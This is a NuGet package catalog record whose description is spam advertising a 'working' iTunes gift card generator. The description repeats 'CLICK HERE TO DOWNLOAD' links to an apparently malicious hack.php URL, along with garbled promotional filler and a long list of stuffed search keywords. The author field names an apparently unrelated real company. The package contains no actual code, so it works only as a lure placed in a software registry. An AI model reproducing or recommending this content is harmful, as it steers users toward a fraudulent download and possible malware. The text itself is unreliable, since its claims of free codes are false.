{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.37.34/_itunes-gift-card-generator-working-2022-version-pvw.4.3.78.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "a82e9e7c-788c-41e2-8b9b-0f0ea9e77c86",
  "catalog:commitTimeStamp": "2022-01-26T10:37:34.8043661Z",
  "created": "2022-01-26T10:35:02.897Z",
  "description": "# _ITunes Gift Card Generator Working 2022 Version pvw\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\n\nFree iTunes Gift Card Codes Generator - % Working. views on Imgur: The magic of the Internet. download [TZUGL] Itunes Gift Card Generator CLICK HERE download 15 sec ago. Free iTunes gift card codes in. If you want to get a free Apple Gift Card Codes this post is just for you!✓ Learn how to use the Apple Promo code generator in 2 minutes!\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://5.bltadwin.ru/hack.php](http://5.bltadwin.ru/hack.php)\n\n · The best iTunes gift card generator | free itunes gift card | free itunes codes. Claim your free iTunes gift card code! You can choose from 25$, 50$ and $ gift cards. This iTunes gift card generator is effortless, online and working. Gift card downloadted Reading Time: 7 mins. CHECK HERE >>>>>> download ¶. iTunes gift card generator free generator online, Whenever you navigate to payments in the Wallet app, there exists a simulation wheel with a “payment nudge” that allows you to select a payment amount and see simply how much interest you’d be charged for the given payment. You can adjust the “nudge” by sliding it . Itunes Code Generator Download. Click The 🌎 Logo To Get Free Code Generator Itunes Gift Cards. or. Copy And Paste This Link In Your Browser download Every Apple user must know about iTunes as almost every thing should be downloaded in iTunes itself.\n\nitunes gift card generator 2021, itunes gift card generator no human verification 2021, itunes gift card generator 2022, itunes gift card generator download, itunes gift card generator no human verification, itunes gift card generator no human verification 2020, itunes gift card generator no survey, itunes gift card generator reddit, itunes gift card generator apk, itunes gift card generator that actually works, free itunes gift card generator app, itunes gift card generator download apk, apple itunes gift card generator, free apple itunes gift card generator, apple itunes gift card code generator, australian itunes gift card code generator, itune gift card generator, itune card generator, itunes gift card code generator, itunes gift card code generator no human verification, itunes gift card code generator 2020, itunes gift card code generator 2021, itunes gift card code generator online, itunes gift card code generator uk, itunes gift card code generator no verification, itunes gift card code free generator, itunes gift card generator no survey or download, itunes 10 dollar gift card code generator, itunes gift card generator 15 euro, itunes gift card generator free, itunes gift card generator fake, free itunes gift card generator no human verification, free itunes gift card generator no human verification 2020, free itunes gift card generator 2020, free itunes gift card generator no human verification 2021, free itunes gift card generator 2021, free itunes gift card generator without human verification, free apple gift card generator, how to get a free itunes gift card generator no surveys, best free gift card generator, how to get free amazon gift cards no surveys, itunes gift card hack 100 code generator, itunes gift card generator illegal, is itunes gift card generator legal, are gift card generators illegal, is gift card generator real, itunes gift card generator 2020, itunes gift card japan generator, itunes gift card key generator, can itunes gift cards be traced, how to get itunes gift cards for free, itunes gift card generator no verification, itunes gift card number generator, itunes gift card online generator, itunes gift card codes free online generator, itunes card code generator online, can you buy itunes gift cards online, real itunes gift card generator, random itunes gift card generator, random itunes gift card code generator, itunes store gift card generator, itunes app store gift card code generator, do gift card generator",
  "id": "_ITunes-Gift-Card-Generator-Working-2022-Version-pvw",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T10:37:33.23Z",
  "listed": true,
  "packageHash": "8ApFPnue6QpTxNmHhbR7WbZj2+ukWbSWfVfSPk9Ij9JPMhkudi8jkdybp8er/Mo4G3UVm1jTIPKMtHRnTg8gqw==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11454,
  "published": "2022-01-26T10:35:02.897Z",
  "requireLicenseAcceptance": false,
  "title": "_ITunes-Gift-Card-Generator-Working-2022-Version-pvw",
  "verbatimVersion": "4.3.78",
  "version": "4.3.78",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.37.34/_itunes-gift-card-generator-working-2022-version-pvw.4.3.78.json#xdaqfduzjr.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1325,
      "fullName": "xdaqfduzjr.nuspec",
      "length": 4490,
      "name": "xdaqfduzjr.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.10.37.34/_itunes-gift-card-generator-working-2022-version-pvw.4.3.78.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9469,
      "fullName": ".signature.p7s",
      "length": 9469,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}